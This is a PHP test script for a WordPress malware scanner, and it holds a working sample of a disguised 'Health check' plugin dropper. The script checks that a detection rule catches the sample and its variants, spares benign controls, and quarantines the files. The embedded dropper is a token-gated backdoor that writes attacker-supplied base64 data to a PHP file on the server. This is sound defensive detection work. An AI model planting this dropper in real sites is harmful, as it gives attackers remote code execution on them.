<?php
// The supplied dropper is scanned as inert data; never included or executed.
$sample = <<<'SAMPLE'
<?php
/*
Plugin Name: wp-hc-bbec5c
Description: Health check
Version: 1.0.1
*/
if(isset($_GET['_nxd'])&&isset($_POST['d'])&&hash_equals('735ef9363eaf7c0a1e23c955',(string)$_GET['_nxd'])){
$p=__DIR__.'/objcache-0ef8c7.php';
if(@file_put_contents($p,base64_decode($_POST['d']))!==false){echo 'NXDROP_OK:'.$p;exit;}
echo 'NXDROP_FAIL';exit;}
SAMPLE;
$repo = dirname(__DIR__, 2);
$id = 'PHP_NXD_HEALTHCHECK_BASE64_DROPPER_001';
$rules = json_decode(file_get_contents($repo . '/intel/patterns/php-malware-rules.json'), true, 512, JSON_THROW_ON_ERROR)['rules'];
$rule = array_values(array_filter($rules, fn($r) => $r['id'] === $id))[0];
$regex = '~' . $rule['pattern'] . '~i';
function check($ok, $message) { if (!$ok) { throw new RuntimeException($message); } }
check(preg_match($regex, $sample) === 1, 'Exact supplied sample');
$variant = str_replace(['bbec5c', '0ef8c7', '735ef9363eaf7c0a1e23c955', '$p'], ['aabb1122', 'abcdef12', str_repeat('a', 32), '$destination'], $sample);
check(preg_match($regex, $variant) === 1, 'Changed plugin name, filename, token and variable');
check(preg_match($regex, str_replace("'", '"', $variant)) === 1, 'Double-quoted strings');
check(preg_match($regex, preg_replace('/\s+/', ' ', $sample)) === 1, 'Single-line formatting');
foreach (['hash_equals', 'base64_decode', 'file_put_contents', 'NXDROP_OK:', 'NXDROP_FAIL', '_nxd'] as $required) {
    check(preg_match($regex, str_replace($required, 'benign_placeholder', $sample)) === 0, 'Incomplete behavior: ' . $required);
}
check(preg_match($regex, str_replace('base64_decode($_POST[\'d\'])', 'base64_decode($trustedLocalData)', $sample)) === 0, 'Local trusted data does not match');
check(preg_match($regex, str_replace("echo 'NXDROP_OK:'.\$p;", "echo 'NXDROP_OK:'.\$other;", $sample)) === 0, 'Unrelated destination variable does not match');
$benign = <<<'PHP'
<?php
/* Plugin Name: Health check */
function health_report($token, $expected, $data) {
    if (hash_equals($expected, $token)) {
        file_put_contents(__DIR__.'/health-report.txt', base64_decode($data));
    }
}
PHP;
check(preg_match($regex, $benign) === 0, 'Benign health report writer');
$base = sys_get_temp_dir() . '/warden-nxd-test-' . bin2hex(random_bytes(6));
foreach (['report', 'plugin', 'mu', 'custom-plugin'] as $mode) {
    $root = $base . '/' . $mode;
    $rel = $mode === 'mu' ? 'wp-content/mu-plugins' :
        ($mode === 'custom-plugin' ? 'wp-content/plugins/custom' : 'wp-content/plugins/wp-hc-bbec5c');
    mkdir($root . '/' . $rel, 0700, true);
    $path = $root . '/' . $rel . '/health.php';
    $sibling = $root . '/' . $rel . '/objcache-0ef8c7.php';
    file_put_contents($path, $sample);
    file_put_contents($sibling, '<?php /* inert adjacent fixture */');
    file_put_contents($root . '/' . $rel . '/.hidden', 'evidence');
    $report = $base . '/' . $mode . '.json';
    $quarantine = $base . '/q-' . $mode;
    $args = [PHP_BINARY, $repo . '/scanner/wp-warden-pef.php', $root,
        '--intel-dir=' . $repo . '/intel', '--noninteractive', '--no-file-cache', '--quiet', '--report-json=' . $report];
    if ($mode !== 'report') {
        $args = array_merge($args, ['--apply', '--quarantine-malware-auto', '--quarantine=' . $quarantine]);
    }
    $output = [];
    exec(implode(' ', array_map('escapeshellarg', $args)) . ' 2>&1', $output, $exit);
    check(is_file($report), 'Report generated: ' . implode("\n", $output));
    $result = json_decode(file_get_contents($report), true, 512, JSON_THROW_ON_ERROR);
    $hits = array_values(array_filter($result['findings'], fn($f) => ($f['rule_id'] ?? '') === $id));
    check(count($hits) === 1 && $hits[0]['severity'] === 'critical', 'One critical family finding in ' . $mode);
    check(is_file($path) === ($mode === 'report'), 'Dropper removed only with cleanup flags in ' . $mode);
    check(is_file($sibling) === ($mode !== 'plugin'), 'Whole directory removed only for fake wp-hc plugin');
    if ($mode !== 'report') {
        $preserved = [];
        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($quarantine, FilesystemIterator::SKIP_DOTS)) as $file) {
            if ($file->isFile()) { $preserved[] = hash_file('sha256', $file->getPathname()); }
        }
        check(in_array(hash('sha256', $sample), $preserved, true), 'Original dropper preserved in quarantine');
        if ($mode === 'plugin') {
            check(in_array(hash('sha256', '<?php /* inert adjacent fixture */'), $preserved, true), 'Adjacent payload preserved');
            check(in_array(hash('sha256', 'evidence'), $preserved, true), 'Hidden file preserved');
        }
    }
}
echo "PASS NXDROP sample, variants, benign controls, report-only scans, fake-plugin tree and MU/custom file quarantine\n";
